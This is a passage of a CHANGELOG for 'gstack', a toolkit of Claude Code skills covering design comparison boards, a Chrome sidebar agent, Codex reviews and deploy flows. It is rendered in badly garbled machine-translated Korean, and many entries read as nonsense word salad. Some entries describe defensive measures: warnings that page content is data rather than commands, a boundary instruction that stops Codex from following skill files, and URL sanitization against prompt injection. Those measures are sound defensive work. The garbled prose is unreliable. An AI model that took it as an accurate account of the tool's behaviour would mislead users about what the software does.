- **비교표.** `$D compare`는 모든 변종, 별 등급, per-variant 의견, 재생 통제, remix 격자 (B에서 색깔과 혼합 배치) 및 제출 단추를 가진 각자에 의하여 거치된 HTML 페이지를 생성합니다. 의견은 HTTP POST를 통해 에이전트으로 돌려보내, DOM polling 아닙니다.
- **`/design-shotgun` 기술.** 독립 디자인 탐험은 언제 실행할 수 있습니다. 여러 AI 디자인 변형을 생성하고 브라우저에서 비교 보드를 열고 방향을 승인 할 때까지 결정합니다. 세션 인식 (이전 탐험), 맛 메모리 (당신의 시선 선호도에 새로운 세대를 사용), 스크린 샷 - 투 - 다양한 (당신이 좋아하지 않는 것을 스크린 샷, 개선을 얻을), 구성 변형 (3-8).
- **`$D serve` 명령.** HTTP 비교표시 루프를 위한 서버. localhost에 널을 봉사하고, default 브라우저에서 열리는, POST를 통해 의견을 모으. Stateful: 재생 돌의 맞은편에 살아남은 체재는, `/api/progress` polling를 통해 동일한 tab 재부하를 지원합니다.
- **`$D gallery` 명령.** 프로젝트의 모든 디자인 탐험의 HTML 타임라인을 생성: 날짜에 의해 조직되는 각 변종, 의견.
- **디자인 메모리.** `$D extract`는 GPT-4o 시각과 쓰기 색깔, 전기, 간격 및 배치 본을 DESIGN.md로 전달한 모조를 분석합니다. 동일한 프로젝트의 미래 모조는 설치된 시각 언어를 상속합니다.
- **비주얼 디퓨핑.** `$D diff`는 두 이미지와 심각성을 가진 지역으로 차이를 식별합니다. `$D verify`는 승인된 모조에 대하여 살아있는 사이트 스크린 샷을 비교하고, pass/fail 문을 통과합니다.
- **스크린 샷 진화.** `$D evolve`는 라이브 사이트 스크린 샷을 취하고 피드백을 기반으로하는 방법을 보여주는 조업을 생성합니다. 현실에서 시작, 공백 캔버스가 아닙니다.
- **책임의 변형.** `$D variants --viewports desktop,tablet,mobile`는 여러 전망port 크기에서 조롱을 생성합니다.
- **디자인 코드 프롬프트.** `$D prompt`는 승인된 모조에서 구현 지시를 추출합니다: 정확한 육색, 글꼴 크기, 간격 가치, 성분 구조. 0개의 해석 간격.

### 변경

- **/office-hours**는 default (skippable)에 의해 시각적인 조업 탐험을 생성합니다. 비교 널은 HTML wireframes를 생성하기 전에 의견에 대한 당신의 브라우저에 열립니다.
- **/plan-design-review**는 비교 널을 위한 `{{DESIGN_SHOTGUN_LOOP}}`를 이용합니다. 7/10의 밑에 디자인 차원 비율이 때 "what 10/10 같이 보기" 모조를 생성할 수 있습니다.
- **/design-consultation**는 단계 5 AI 조업 검토를 위한 `{{DESIGN_SHOTGUN_LOOP}}`를 이용합니다.
- **비교 보드 포스트 서브 수명주기.** 제출 후, 모든 입력이 비활성화되고 "코딩 에이전트로 반환" 메시지가 나타납니다. 재생 후, 새로운 디자인이 준비 될 때 자동 재빠린과 함께 스핀너 쇼. 서버가 사라지면 복사 JSON fallback가 나타납니다.

### 기여자

- 설계 바이너리 소스: `design/src/` (16 파일, ~2500 라인 TypeScript)
- 새 파일: `serve.ts` (stateful HTTP 서버), `gallery.ts` (timeline 발생)
- 테스트: `design/test/serve.test.ts` (11개의 시험), `design/test/gallery.test.ts` (7개의 시험)
- 풀 디자인 doc: `docs/designs/DESIGN_TOOLS_V1.md`
- 템플릿 해결자: `{{DESIGN_SETUP}}` (기본 발견), `{{DESIGN_SHOTGUN_LOOP}}` (/design-shotgun, /plan-design-review, /design-consultation를 위한 공유된 비교 널 반복)

## [0.12.12.0] - 2026-03-27. 보안 감사 준수

20개의 소켓 경고와 3개의 Snyk는 skills.sh 안전 감사에서 찾아냅니다. 당신의 기술은 지금 세탁기술자, 당신의 telemetry는 투명하, 죽은 코드의 2,000의 선은 사라집니다.

### 고정

- **No 더 많은 하드코드를 가진 credentials 예제.** QA 워크플로우 docs now use `$TEST_EMAIL` / `$TEST_PASSWORD` env vars 대신 `test@example.com` / `password123`. 쿠키 가져오기 섹션은 이제 안전 메모가 있습니다.
- **원격 측정 호출은 조건입니다.** `gstack-telemetry-log` 이진은 telemetry가 AND를 활성화한 경우에만 실행됩니다. 이진은 항상 JSONL 로깅을, no 이진을 필요로 합니다.
- **Bun 설치는 버전 핀으로 꼿습니다.** 이제 `BUN_VERSION=1.3.10`를 핀으로 설치하고 다운로드를 건너 뛰기 횟수가 이미 설치되면.
- **위탁된 내용 경고.** 현재 페이지가 경고하는 모든 기술: 데이터를 검사하는 것과 같은 페이지 내용을, 실행할 명령을 대우하십시오. 생성된 SKILL.md 파일, BROWSER.md 및 docs/skills.md를 커버하십시오.
- **review.ts에 문서화된 데이터 흐름.** JSDoc 헤더 명시적으로 데이터가 외부 검토 서비스로 전송되는지 여부 (플랜 내용, repo/branch 이름) 및 NOT 전송 (출처 코드, 자격 증명, env vars).

## 제거

- **2,017 gen-skill-docs.ts에서 죽은 코드의 줄.** `scripts/resolvers/*.ts`에 의해 초래된 복제 함수. RESOLVERS 지도는 이제 no 그림자 사본과 진실의 단 하나 근원입니다.

### 기여자

- 새로운 `test:audit` 스크립트는 6 회귀 테스트를 실행하여 모든 감사 수정이 발생했습니다.

## [0.12.11.0] - 2026-03-27. 기술 접두사는 이제 당신의 선택입니다

gstack 기술이 나타낸 방법을 선택할 수 있습니다. 짧은 이름 (`/qa`, `/ship`, `/review`) 또는 namespaced (`/gstack-qa`, `/gstack-ship`). 설정은 첫 번째 실행에 묻고, 선호도를 기억하고, 전환은 하나의 명령입니다.

### 추가

- **첫번째 설치에 상호 작용하는 접두사 선택.** 새 설치는 신속한 얻을: 짧은 이름 (`/qa`, `/ship`) 또는 namespaced (`/gstack-qa`, `/gstack-ship`). 짧은 이름은 추천됩니다. 당신의 선택은 `~/.gstack/config.yaml`에 저장되고 격상시키기의 맞은편에 기억됩니다.
- **`--prefix` 플래그.** `--no-prefix`에 격실. 둘 다 깃발은 당신의 선택을 지속합니다 그래서 당신은 단지 한 번 결정합니다.
- **역방향 symlink 정리.** namespaced에서 평평하게 전환 (또는 vice versa) 이제 오래된 symlinks를 청소합니다. No Claude Code에서 보여주는 더 많은 중복 명령.
- **Namespace-aware 기술 제안.** 모든 28의 기술 템플릿은 이제 접두사 설정을 확인합니다. 한 기술이 다른 것을 제안할 때 (`/ship` 제안 `/qa`), 그것은 당신의 설치를 위해 적당한 이름을 사용합니다.

### 고정

- **`gstack-config`는 리눅스에서 작동합니다.** BSD- 휴대용 `mktemp`+`mv`를 가진 `sed -i ''`를 대체했습니다. Config는 GNU/Linux와 WSL에 지금 일합니다.
- **자주 묻는 질문** 첫 번째 설치에 "Welcome!" 메시지가 `~/.gstack/`가 설정에서 이전 생성 된 것처럼 보였다. `.welcome-seen` sentinel 파일로 고정.

### 기여자

- 8개의 새로운 구조상 테스트는 prefix config 시스템 (gen-skill-docs의 총 223개)를 테스트합니다.

## [0.12.10.0] - 2026-03-27. Codex 파일 시스템 경계

Codex는 `~/.claude/skills/`로 방황하고 gstack의 코드를 검토 대신 자신의 지시를 따르는. 이제 각 코덱 프롬프트는 저장소에 집중한 경계 지시를 포함합니다. /codex, /autoplan, /review, /ship, /plan-eng-review, /plan-ceo-review, /office-hours의 전 11개의 콜드를 커버합니다.

### 고정

- **Codex는 repo에 머물.** 모든 `codex exec`와 `codex review`는 지금 Codex를 무시하기 위하여 파일시스템 경계 지시를 미리 뒀습니다 기술 정의 파일을 말했습니다. Codex를 읽기에서 SKILL.md preamble 스크립트를 방지하고 세션 추적 및 업그레이드 체크에 8+ 분을 낭비하십시오.
- **Rabbit-hole 탐지.** Codex 산출이 기술 파일 (`gstack-config`, `gstack-update-check`, `SKILL.md`, `skills/gstack`)에 의해 쫓아 낸 표시가, /codex 기술 지금 경고를 포함하고 재기를 건의합니다.
- **5 회귀 테스트.** 새로운 테스트 스위트는 경계 텍스트가 모든 7 코덱 호출 기술에 나타납니다, Filesystem 경계 섹션은 존재, 토끼 홀 감지 규칙 존재, autoplan은 크로스 호스트 호환 경로 패턴을 사용합니다.

## [0.12.9.0] - 2026-03-27. 커뮤니티 홍보 : 더 빠른 설치, 기술 Namespacing, 제거

한 번에 착륙 한 6 커뮤니티 PR. 설치가 빠르며, 다른 도구와 더 긴 콜드, 그리고 당신은 필요시 gstack를 제거 할 수 있습니다.

### 추가

- **스크립트 제거.** `bin/gstack-uninstall`는 체계에서 gstack를 청소합니다: 숨겨지은 데몬을, 제거합니다 모든 기술 설치를 제거하십시오 (Claude/Codex/Kiro), 정리 국가. 지원 `--force` (skip 확인) 및 `--keep-state` (preserve config). (#323)
- **Python /review의 보안 패턴.** 포탄 주입 (`subprocess.run(shell=True)`), SSRF를 통해 LLM 생성한 URL, 저장된 신속한 주입, async/sync 섞고, 란 이름 안전 체크는 지금 Python 프로젝트에 자동적으로 불을 붙입니다. (#531)
- **Codex가 없는 Office-hours 일.** 이제는 Claude CLI가 사용되지 않는 경우 Claude subagent로 돌아갑니다, 그래서 모든 사용자는 크로스 모델 관점을 가져옵니다. (#464)

### 변경

- **더 빠른 설치 (~30s).** 이제 모든 복제 명령은 `--single-branch --depth 1`를 사용합니다. 기여자를 위해 전체 역사가 가능합니다. (#484)
- **`gstack-` 접두사로 구성된 기술명.** 기술 symlinks는 지금 `gstack-review`, `gstack-ship`, 대신에 벌거벗은 `review`, `ship`의 현재 입니다. 다른 기술 팩과 충돌을 방지합니다. 오래된 symlinks는 격상에 자동 세척됩니다. `--no-prefix`를 사용하여 밖으로 선택하십시오. (#503)

### 고정

- **Windows 항구 인종 상태.** `findPort()`는 `net.createServer()` 대신 `Bun.serve()` 포트 프로빙에 EADDRINUSE 레이스를 Windows에 놓는 `stop()`는 불-and-forget입니다. (#490)
- **package.json 버전 동기화.** VERSION 파일 및 package.json는 지금 동의합니다 (0.12.5.0에 붙어 있습니다).

## [0.12.8.1] - 2026-03-27. zsh Glob 호환성

기술 스크립트는 이제 zsh에서 올바르게 작동합니다. 이전에는 기술 템플릿의 bash 코드 블록은 `.github/workflows/*.yaml` 및 `ls ~/.gstack/projects/$SLUG/*-design-*.md`와 같은 원시 글로그 패턴을 사용하여 "no 일치" 오류가 일치했을 때 zsh에서 발생했습니다. 고정 38 템플릿과 2 개의 접근법을 사용하여 인스턴스 : 복잡한 패턴에 대한 `find` 기반 대안, 그리고 `setopt +o nomatch` 간단한 `ls` 명령을 위해 가드.

### 고정

- **`.github/workflows/` globs는 `find`로 대체했습니다.** `cat .github/workflows/*deploy*`, `for f in .github/workflows/*.yml`, `/land-and-deploy`, `/setup-deploy`, `/cso`, 그리고 지금 퍼스트스트스트스트스트랩 결심사는 원시적 혈당 대신 `find ... -name`를 사용합니다.
- **`~/.gstack/`와 `~/.claude/` 은 `setopt`로 보호했습니다.** 디자인 doc 보기, eval 결과 목록, 테스트 계획 발견, 그리고 개조 역사는 10의 기술에 걸쳐 체크 지금 prepend `setopt +o nomatch 2>/dev/null || true` (bash에 있는 노 op, zsh에서 NOMATCH를 무능하게 합니다).
- **테스트 프레임 워크 감지 globs 가드.** `ls jest.config.* vitest.config.*` 테스트 결심자에서 이제는 setopt 감시가 있습니다.

## [0.12.8.0] - 2026-03-27. Codex No 더 긴 리뷰 잘못된 프로젝트

여러 작업 공간에 gstack를 실행할 때 Codex는 잘못된 프로젝트를 침묵적으로 검토할 수 있었습니다. `codex exec -C` 플래그는 repo 루트 인라인을 `$(git rev-parse --show-toplevel)`로 해결했습니다. 이는 배경 쉘 상속을 계산하는 모든 것을 평가합니다. 다 작업 공간 환경에서 cwd는 다른 프로젝트가 완전히 될 수 있습니다.

### 고정

- **Codex 실행은 repo root eagerly를 해결합니다.** 모든 12 `codex exec`는 `/codex`, `/autoplan`, 그리고 4개의 결산 기능은 각각 bash 구획의 정상에 `_REPO_ROOT`를 해결하고 `-C`에 저장된 값을 참조합니다. No 다른 작업 공간과 경주하는 인라인 평가.
- **`codex review` 또한 cwd 보호를 얻.** `codex review`는 `-C`를 지원하지 않습니다, 그래서 지금 invocation의 앞에 `cd "$_REPO_ROOT"`를 가져옵니다. 버그의 동일한 종류, 다른 명령.
- **Silent fallback은 하드 실패로 대체됩니다.** `|| pwd`는 임의의의 cwd가 사용할 수 있는 것을 조용히 사용합니다. 이제는 git repo에 없는 명확한 메시지로 오류가 나옵니다.

## 제거

- **gen-skill-docs.ts에서 수정된 해결자 사본.** 6개의 기능은 `scripts/resolvers/` 달 전으로 이동되었지만 결코 삭제되지 않았습니다. 그들은 이미 살아있는 버전에서 논쟁하고 오래된 취약한 본을 포함했습니다.

### 추가

- **회귀 시험**는 `.tmpl`, `.ts`, `SKILL.md` 파일이 인라인 `$(git rev-parse --show-toplevel)`를 사용하여 코덱 명령을 위해 생성된 `SKILL.md` 파일을 검사합니다. 리인트로테이션을 방지합니다.

## [0.12.7.0] - 2026-03-27. 커뮤니티 홍보 + 보안 강화

7개의 커뮤니티가 합병, 검토 및 테스트합니다. 원격 측정 및 검토 로깅 및 E2E 테스트 안정성 수정을 위해 더 안전한 보안.

### 추가

- **Dotfile 필터링 기술 발견.** 숨겨진 감독 (`.git`, `.vscode`, 등)은 no 더 긴 기술 템플릿으로 픽업됩니다.
- **JSON 검토 로그의 유효성 검사 게이트.** 변형 입력은 JSONL 파일에 부합하는 대신 거부됩니다.
- **원격 측정 입력 위생.** 모든 문자열 필드는 JSONL에 쓰여지기 전에 인용, backslashes 및 제어 문자로 구부리고 있습니다.
- **호스트 별 코스 트레일러.** `/ship`와 `/document-release`는 이제 Codex 대 클로드를 위한 정확한 공동 저자 선을 사용합니다.
- **10 새로운 보안 테스트** 덮음 telemetry 주입, 검토 로그 검증, 및 dotfile 필터링.

### 고정

- **`./` no를 시작하는 파일 경로는 CSS selectors로 더 긴 대우했습니다.** `$B screenshot ./path/to/file.png` 이제 CSS 요소를 찾는 대신 작동합니다.
- **체인 탄력을 구축하십시오.** `gen:skill-docs` 실패 no 더 긴 구획 이진 컴파일.
- **업데이트 체크러가 떨어졌다.** 업그레이드 후, 체크러는 이제는 중지 대신 새로운 원격 버전에 대한 체크를 합니다.
- **Flaky E2E 테스트 안정.** `browse-basic`, `ship-base-branch`, `review-dashboard-via` 시험은 시험 정착물으로 가득 차있는 1900 선 파일을 복사하는 대신에 단지 관련 SKILL.md 단면도를 추출해서 믿을 수 있는 통과합니다.
- **믿을 수 없는 `journey-think-bigger` 여정 시험 제거.** 라우팅 신호가 너무 주변 이었기 때문에 믿을 수 없을 것. 10 다른 여행 시험은 명확한 신호로 여정을 커버합니다.

### 기여자

- 새로운 CLAUDE.md 규칙: E2E 시험 정착물으로 가득 차있는 SKILL.md 파일을 복사하지 마십시오. 관련 단면도를 단지 추출하십시오.

## [0.12.6.0] - 2026-03-27. 사이드바는 당신이 무엇을에 알 수 있습니다

Chrome 사이드바 에이전트는 뭔가를 요청할 때 잘못된 페이지로 이동하기 위해 사용. 당신은 사이트에 수동으로 검색 된 경우, 사이드바는 무시하고 어떤 Playwright 마지막으로 본 (실행된 해커 뉴스 데모에서). 지금 작동.

### 고정

- **Sidebar는 실제 탭 URL을 사용합니다.** Chrome 확장은 `chrome.tabs.query()`를 통해 실제 페이지를 URL 붙잡고 서버로 보냅니다. 이전의 측바 에이전트은 headed 형태에서 수동으로 탐색될 때 headed 형태를 새롭게 하지 않은 Playwright의 stale `page.url()`를 사용했습니다.
- **URL 질화.** 확장 프로비저닝 URL는 Claude 시스템 프롬프트에서 사용되기 전에만, 제어 문자 스트리핑, 2048 char limit)를 유효화 (http/https)를 검증됩니다. 만들어진 URL을 통해 신속한 주입을 방지합니다.
- **Stale sidebar 에이전트는 재연결에 살았다.** 각 `/connect-chrome`는 이제 새로운 것을 시작하기 전에 leftover sidebar-agent 프로세스를 죽이고 있습니다. 오래된 에이전트은 stale auth 토큰을 가지고 침묵적으로 실패하고, sidebar를 얼어붙게 해줄 것입니다.

### 추가

- **`/connect-chrome`를 위한 전 flight 정리.** Kills stale은 서버와 연결하기 전에 Chromium 단면도 자물쇠를 청소합니다. 충돌 후에 "알레이 연결되는" 틀린 긍정적인 긍정적인 긍정을 방지합니다.
- **Sidebar 에이전트 테스트 스위트 (36 테스트).** 4개의 층: URL 위생을 위한 단위 시험, 서버 HTTP 엔드포인트, 모조 원형 왕복 시험 및 진짜 클로드를 가진 E2E 시험. 층 4.를 제외하고 모든 자유로운

## [0.12.5.1] - 2026-03-27. Eng Review 이제 병렬화에 대한 정보를 알려줍니다.

`/plan-eng-review`는 병렬 실행 기회를 위한 계획을 자동 분석합니다. 계획이 독립된 스트림을 가지고 있을 때, 검토는 의존성 테이블, 평행한 차선을 출력하고, 순서를 실행하기 때문에 당신은 정확하게 분리되는 git worktrees로 분할하는 것을 알고 있습니다.

### 추가

- **Worktree 병렬화 전략** `/plan-eng-review` 필수 출력. 모듈 레벨 의존성, 계산 병렬 차선, 플래그 merge 충돌 위험으로 계획 단계의 구조 테이블을 추출합니다. 단일 모듈 또는 단일 트랙 계획에 대해 자동으로 건너 뛰십시오.

## [0.12.5.0] - 2026-03-26. Codex 행을 고치십시오: 30 분은 골짜기입니다

`/codex`의 세 가지 버그는 계획 리뷰 및 Adversarial 체크 중 0 개 출력을 가진 30 + 분 걸린다. 모든 세 가지가 고정되어 있습니다.

### 고정

- **계획 파일이 Codex sandbox에 표시됩니다.** Codex는 repo 루트에 sandboxed를 달고 `~/.claude/plans/`에 계획 파일을 볼 수 없습니다. 그것은 10+ 도구를 위로 주기 전에 찾는 낭비할 것입니다. 이제 계획 내용은 신속하고 참조된 근원 파일에서 직접 끼워넣고 Codex는 그(것)들을 즉시 읽습니다.
- **출력을 스트리밍 실제로 스트림.** Python의 stdout 버퍼링은 프로세스가 종료될 때까지 0 출력을 가해지게 합니다. `PYTHONUNBUFFERED=1`, `python3 -u`, `flush=True`를 3개의 Codex 형태를 가로 질러 각 인쇄 통화에 추가했습니다.
- **Sane의 노력 과태.** 대체된 하드코드 `xhigh` (23x 더 많은 토큰, OpenAI 문제 #8545, #8402, #6931) 당 모드 디폴트로 `high`, 검토 및 도전, `medium`, 상담을 위해 `--xhigh` 플래그로 겹쳐 쌓일 수 있습니다.
- **`--xhigh`는 모든 형태에서 실행합니다.** 오버라이드 알림은 도전과 상담 모드 지침에서 누락되었습니다. adversarial 검토에 의해 발견.

## [0.12.4.0] - 2026-03-26. /ship의 전체 소모 적용

12개의 커밋이 있는 branch를 발송할 때 성능 작업, 죽은 코드 제거 및 테스트 인프라를 중단하고 PR는 3개를 모두 언급해야 합니다. 그것은 아니었다. CHANGELOG와 PR는 최근 어떤 일이 일어나지 않고, 끊임없이 초기 작업을 삭제하는 것을 비스듬히 떨어뜨렸습니다.

### 고정

- **/ship 단계 5 (CHANGELOG):** 이제는 쓰기 전에 commit의 과잉을 강제합니다. 테마로 각 commit, 그룹을 나열하고, 입력을 작성하고, 그 다음 각 commit가 총알에 맵을 곱합니다. No 더 recency bias.
- **/ship 단계 8 (PR 몸):** 명시된 커밋으로 진행되는 CHANGELOG"의 bullet 포인트에서 변경. 그룹은 논리 섹션으로 커밋합니다. VERSION/CHANGELOG 메타데이터 commit (서버, 변경되지 않음)를 제외합니다. 모든 하위스타티브 commit는 어딘가에 나타야 합니다.

## [0.12.3.0] - 2026-03-26. 음성 지침 : 모든 기술 사운드 빌더처럼

모든 gstack 기술에는 이제 음성이 있습니다. 성격이 아닌 사람도 아니지만, 오늘 코드를 배송하고 실제 사용자를 위해 작동하는지 여부를 걱정하는 사람과 같은 Claude 사운드를 만드는 지침의 일관성있는 세트. 직접, 콘크리트, 날카로운. 파일 이름을, 함수, 명령. 기술 작업을 연결하여 사용자의 실제 경험.

두 계층: 경량 기술은 트리밍된 버전 (톤 + 쓰기 규칙)을 얻을. 전체 기술은 전략을 위한 컨텍스트 의존 톤 (YC 파트너 에너지, 코드 검토, 디버깅에 대한 수석 eng), 콘크리트 표준, 유머 보정 및 사용자 아웃 코디 가이드와 완전한 지침을 얻을.

### 추가

- **모든 25 기술에 대한 음성 지침.** `preamble.ts`에서 생성하는, 템플릿 해결자를 통해 주사. Tier 1 기술은 4 줄 버전을 얻습니다. Tier 2+ 기술은 전체 지침을 얻습니다.
- **Context 의존하는 음색.** 컨텍스트 일치: YC, `/plan-ceo-review`, `/review`, `/investigate`를 위한 최고 기술적인blog 포스트를 위한 수석 eng.
- **구체적인 기준.** " 정확한 명령을 표시하십시오. 실제 번호를 사용하십시오. 정확한 줄의 포인트." 영감이 아닙니다. 시행.
- **사용자의 연결.** "사용자가 3초 스피너를 볼 수 있기 때문에이 문제입니다." 사용자의 실제를 만듭니다.
- **LLM eval 시험.** 심사위원은 직접, 콘크리트, 항전투명 톤, AI vocabulary 피하, 사용자 결과 연결 점수를 매깁니다. 모든 차원은 4/5+를 점수해야 합니다.

## [0.12.2.0] - 2026-03-26. Confidence와 배포 : 첫 번째 론적 인 실행

프로젝트에서 `/land-and-deploy`를 실행하는 첫 번째 시간, 건조한 실행입니다. 그것은 모든 명령이 작동하고, 정확히 무슨 일이 일어날지 보여줍니다. 그것은 아무것도 터치하기 전에, 그리고 그 다음에서 작동.

배포 설정이 나중에 변경되면 (새로운 플랫폼, 다른 워크플로우, 업데이트 URL), 자동으로 건조 실행을 다시 실행합니다. 신뢰는 지상 이동이 될 때 획득, 유지 및 재 유효성.

### 추가

- **첫 번째 실행 건조 실행.**는 검증 테이블에 배치 인프라를 보여줍니다: 플랫폼, CLI 상태, 생산 URL 가시성, 노후화 탐지, merge 방법, merge 큐 상태. 당신은 어떤 의미가 없는 것의 앞에 확인합니다.
- **Staging-first 옵션.** 시술이 감지되면 (CLAUDE.md config, GitHub 동작 워크플로우, 또는 Vercel/Netlify 미리보기), 먼저 배포할 수 있으며, 작동을 확인한 후 생산 진행합니다.
- **Config 감퇴 탐지.** 배치 구성의 지문을 저장하는 건식 체크. CLAUDE.md의 배치 섹션 또는 배치 워크플로우 변경이면 건조 런트 리 트리거가 자동으로 업데이트됩니다.
- **인라인 검토 문.** no 최근 코드 검토가 존재하면, merging 전에 diff에 빠른 안전 검사를 제공합니다. Catches SQL 안전, 인종 조건 및 배포 시간에 보안 문제.
- **메르지 큐어 인식.** repo가 merge 큐를 사용하며, 그 동안 무슨 일이 일어나는지 설명합니다.
- **CI 자동 배치 탐지.** 배포 워크플로를 merge로 트리거하고 모니터링합니다.

### 변경

- **전체 복사를 다시 작성합니다.** 모든 사용자 직면 메시지는 무슨 일이 일어나는지, 왜 설명하고, 특정한. 첫번째 실행 = 교사 형태. 초래 실행 = 능률적인 형태.
- **음성 & 음색 단면도.** 기술이 어떻게 통신하는지 새로운 가이드라인: 개발자 옆에 앉아있는 수석 릴리스 엔지니어가 로봇이 아닌.

## [0.12.1.0] - 2026-03-26. 더 똑똑한 파열: 네트워크 상들, 국가 지속, Iframes

click, fill, 그리고 지금 반환하기 전에 해결하기 위하여 페이지를 기다리십시오. No 더 stale 스냅샷은 XHR가 아직도 안으로 flight 때문에. 사슬은 더 빠른 다단계 교류를 위한 관 분리한 체재를 받아들입니다. 당신은 브라우저 회의 (cookies + 열린 탭)를 절약하고 복원할 수 있습니다. 그리고 iframe 내용은 지금 도달 가능합니다.

### 추가

- **네트워크 유휴 탐지.** `click`, `fill`, `select`는 반환하기 전에 정착하기 위하여 네트워크 요구에 2s까지 자동 낭비합니다. 상호 작용에 의해 방아쇠를 박아지는 Catches XHR/fetch. Playwright의 붙박이 `waitForLoadState('networkidle')`, 주문 추적자 아닙니다.

- **`$B state save/load`.** 브라우저 세션 저장 (cookies + open tabs) 이름 파일에, 나중에로드. 0o600 권한으로 `.gstack/browse-states/{name}.json`에 저장 된 파일. V1는 쿠키 + URL을 저장합니다 (로드 - 베포 - 네비게이트에 깰 로컬 저장). 부하가 현재 세션을 대체하지 않습니다.

- **`$B frame` 명령.** 스위치 명령은 iframe으로 컨텍스트를 전환합니다: `$B frame iframe`, `$B frame --url stripe`, 또는 `$B frame @e5`. 모든 후속 명령 (click, fill, snapshot, 등)는 iframe 내부에서 작동합니다. `$B frame main`는 메인 페이지로 돌아갑니다. 스냅샷은 `[Context: iframe src="..."]` 헤더를 보여줍니다. 분리된 프레임 자동 회복.

- **사슬 관 체재.** Chain은 JSON 파싱이 실패할 때 `$B chain 'goto url | click @e5 | snapshot -ic'`를 떨어뜨릴 때 `$B chain 'goto url | click @e5 | snapshot -ic'`를 허용합니다. 따옴표를 인식한 관 분리.

### 변경

- **체인 포스트 루프 요들 대기.** 체인에서 모든 명령을 실행한 후, 마지막이 쓰기 명령이었던 경우, 반환하기 전에 네트워크 해시를 기다리는 것이 좋습니다.

### 고정

- **Iframe ref 스코핑.** Snapshot ref 로케이터, 커서 인터랙티브 스캔, 커서 로케이터는 이제 메인 페이지로 항상 스코핑 대신 프레임 인식 대상을 사용합니다.
- **분리된 구조 회복.** `getActiveFrameOrPage()`는 `isDetached()`와 자동 회복을 검사합니다.
- **상태 하중 리셋 프레임 컨텍스트.** 저장된 국가를 적재하는 것은 유효 구조 참고를 삭제합니다.
- **elementHandle 누출 프레임 명령.** 이제 contentFrame을 얻은 후 제대로 분해.
- **명령 프레임 인식을 업로드합니다.** `upload`는 파일 입력 위치인을 위한 구조 인식 표적을 이용합니다.

## [0.12.0.0] - 2026-03-26. Headed 모드 + 사이드바 에이전트

Claude 를 실제 Chrome 창에서 보고 사이드바 채팅에서 직접 볼 수 있습니다.

### 추가

- **Headed 사이드바 에이전트 모드.** `$B connect`는 gstack 연장을 가진 가시 Chrome 창을 발사합니다. 측 패널은 당신이 자연 언어 지시를 타는 매 명령 AND의 살아있는 활동 급식을 보여줍니다. 아이 Claude 인스턴스는 브라우저에 있는 당신의 요구를 실행합니다 ... 페이지를, click 단추, fill 모양, 추출물 자료. 각 작업은 5 분까지 얻습니다.

- **개인 자동화.** 사이드바 에이전트는 dev 워크플로우를 넘어 반복적인 브라우저 작업을 처리합니다. 아이의 학교 부모 포털을 찾아서 부모 연락처 정보를 Google 연락처로 추가하십시오. 공급업체를 내장 양식으로 작성하십시오. 대시보드에서 데이터를 추출하십시오. headed 브라우저에서 로그인하거나 `/setup-browser-cookies`로 실제 Chrome에서 쿠키를 가져가십시오.

- **Chrome 확장.** 도구 모음 배지 (green=connected, grey=not), 활동 피드 + 채팅 + refs 탭, @ref 페이지에 오버레이, 그리고 gstack 제어를 보여주는 연결 알약. 당신이 `$B connect`를 실행할 때 자동 로드.

- **`/connect-chrome` 기술.** 가이드 설정: Chrome를 실행하고, 확장을 검증하고, 활동 피드를 데모하고, 사이드바 채팅을 소개합니다.

### 변경

- **사이드바 에이전트 ungated.** 이전 필요 `--chat` 플래그. 이제 항상 headed 모드에서 사용할 수 있습니다. 사이드바 에이전트는 Claude Code 자체 (Bash, 읽기, Glob, localhost에 Grep)와 같은 보안 모델을 가지고 있습니다.

- **5 분 정도의 에이전트 타임 아웃.** 멀티 페이지 작업 (번역, 페이지의 작성 양식)은 이전 2 분 제한보다 더 필요합니다.

## [0.11.21.0] - 2026-03-26

### 고정

- **`/autoplan` 리뷰는 배 읽음 게이트로 계산합니다.** `/autoplan` ran full CEO + Design + Eng review, `/ship`는 자동 계획 로그인 항목이 올바르게 읽지 않기 때문에 Eng Review에 대한 "0 실행"을 보여주었다. 이제 대쉬보드는 소스 attribution (예 : "CLEAR (PLAN를 통해 /autoplan)를 표시할 수 있으므로 각 리뷰에 만족한 도구가 정확히 볼 수 있습니다.
- **`/ship` no 더 긴 "열려있는 /review 처음."** 배는 단계 3.5에 있는 그것의 자신의 전 착륙 검토를 실행합니다. 당신은 동일한 검토를 따로따로 실행하는 것을 요구했습니다. 문은 제거됩니다; 배는 다만 그것을 합니다.
- **`/land-and-deploy` 이제 8가지 리뷰 유형들을 확인합니다.** 이전 `review`, `adversarial-review`, `codex-plan-review`를 놓았습니다. `/review` (`/plan-eng-review`), 토지 및 배포가 아닌 경우도 있습니다.
- **Dashboard 외부 음성 행은 이제 작동합니다.**는 `/plan-ceo-review` 또는 `/plan-eng-review`에서 외부 목소리가 ran 후에도 "0 실행"을 보여주었습니다. 이제 `codex-plan-review` 항목에 올바르게 맵을 올바르게 맵니다.
- **`/codex review` 이제 staleness를 추적합니다.** 코드 검토 로그 항목에 `commit` 필드를 추가했습니다. 그래서 대쉬보드는 코덱 검토가 나타날 때 감지 할 수 있습니다.
- **`/autoplan` no 더 긴 하드 코드 "깨끗한" 상태.** 자동 플랜의 로그 항목을 항상 기록 `status:"clean"` 문제가 발견되었을 때에도 사용. 이제 Claude가 실제 값으로 대체하는 적절한 위주 토큰을 사용합니다.

## [0.11.20.0] - 2026-03-26

### 추가

- **`/retro` 및 `/ship`를 위한 GitLab 지원.** 이제 GitLab 저장소에서 `/ship`를 실행할 수 있습니다. `glab mr create` 대신 `gh pr create`를 통해 merge 요청을 생성합니다. `/retro`는 두 플랫폼에 default branch를 검출합니다. `BASE_BRANCH_DETECT`를 사용하는 모든 11개의 기술은 GitHub, GitLab 및 git-native fallback 탐지를 자동적으로 얻습니다.
- **GitHub 기업과 각자 호스팅된 GitLab 탐지.** 리모트 URL가 `github.com` 또는 `gitlab`, gstack가 `gh auth status`/ `glab auth status`를 정정된 플랫폼을 검출하지 않는 경우에 no 수동 구성을 검사하지 않는 경우에.
- **`/document-release`는 GitLab에서 작동합니다.** `/ship`가 merge 요청을 작성한 후 자동 호출 `/document-release`가 MR체를 `glab`를 통해 자동 업데이트하고 자동으로 실패한 상태에서 업데이트합니다.
- **`/land-and-deploy`를 위한 GitLab 안전 문.** GitLab repos에서 침묵적으로 실패하는 대신 `/land-and-deploy`는 이제 GitLab merge 지원이 아직 구현되지 않는 명확한 메시지로 일찍 멈추지 않습니다.

### 고정

